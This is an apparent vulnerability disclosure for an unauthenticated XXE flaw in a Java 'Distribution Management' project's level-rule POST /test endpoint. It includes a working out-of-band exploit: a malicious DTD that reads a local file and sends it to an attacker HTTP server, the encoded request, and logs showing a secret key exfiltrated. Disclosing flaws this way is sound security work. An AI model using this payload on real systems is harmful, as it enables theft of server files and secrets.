# Distribution Management XXE vulnerability report

## Vulnerability Description

The Distribution Management system is composed of 4 modules (dist-primary, dist-front, dist-api, level-rule). The level-rule module exposes a `POST /test` endpoint for XML rule parsing. The `XmlParseService.doXMLParse()` method uses `org.dom4j.io.SAXReader` with default configuration — no DTD or external entity restrictions are set. This allows attackers to submit malicious XML payloads to conduct XXE (XML External Entity) attacks without any authentication.

---

## Affected Versions

Distribution Management v1.0.0

---

## Utilize conditions

- The target exposes the level-rule module
- No authentication required for `POST /test`

---

## Vulnerability Reproduction

### Vulnerability 1: XXE — Unauthorized Arbitrary File Read via file:// Protocol

**File path**：`level-rule/src/main/java/com/rule/graph/service/XmlParseService.java`
**Line number**：68-69

```java
SAXReader reader = new SAXReader();                         // ← No security features set
Document document = reader.read(new ByteArrayInputStream(xml.getBytes()));  // ← User XML parsed directly
```

![image-20260812160640052](https://github.com/fangtang7/picx-images-hosting/raw/master/Distribution-Management/image-20260812160640052.wja59fis4.webp)

**Missing security configuration**：

```java
// All missing:
reader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
reader.setFeature("http://xml.org/sax/features/external-general-entities", false);
reader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

**Exposed Controller**：`IndexController.java` Line 27-31

```java
@RestController
public class IndexController {
    @Autowired
    XmlParseService xmlParseService;

    @PostMapping("/test")                          // ← No auth annotation
    public String test(String xml, String pageType) throws Exception {
        xmlParseService.doXMLParse(xml, pageType);  // ← User XML parsed
        return "sucess";
    }
}
```

![image-20260812160734632](https://github.com/fangtang7/picx-images-hosting/raw/master/Distribution-Management/image-20260812160734632.8hh79gn2ni.webp)

**Proof of Concept — OOB File Exfiltration (Out-of-Band)**：

The attacker hosts a malicious DTD on a controlled HTTP server:

`evil.dtd`:

```xml
<!ENTITY % file SYSTEM "file:///C:/tmp/test.txt">
<!ENTITY % dtd2 "<!ENTITY send SYSTEM 'http://127.0.0.1:8888/exfil?%file;'>">
%dtd2;
```

Request:

```
POST /test HTTP/1.1
Host: 127.0.0.1:8081
Content-Type: application/x-www-form-urlencoded

xml=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20%25%20dtd%20SYSTEM%20%22http%3A%2F%2F127.0.0.1%3A8888%2Fevil.dtd%22%3E%25dtd%3B%5D%3E%3Croot%3E%26send%3B%3C%2Froot%3E&pageType=1
```

URL-decoded XML body:

```xml
xml=<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://127.0.0.1:8888/evil.dtd">
  %dtd;
]>
<root>&send;</root>
&pageType=1
```

![image-20260812160511209](https://github.com/fangtang7/picx-images-hosting/raw/master/Distribution-Management/image-20260812160511209.8adze11lwh.webp)

Step 1 — target fetches external DTD:

```
[HTTP] GET /evil.dtd HTTP/1.1 → 200
```

Step 2 — target sends file content to attacker's HTTP server:

```
[+] INCOMING: /exfil?SECRET_KEY=abc123def456
```

Error-based confirmation in response:

```json
{
  "message": "Error on line 1 of document http://127.0.0.1:8888/exfil?SECRET_KEY=abc123def456 : ..."
}
```

**Analysis**：

- The attacker hosts `evil.dtd` on a local HTTP server (port 8888).
- The DTD reads the target file via `file://` and embeds the content into an HTTP URL entity.
- When the XML parser resolves the `&send;` entity, it sends an HTTP request carrying the file content as a query parameter.
- The attacker's server logs the incoming request, completing the blind XXE data exfiltration.

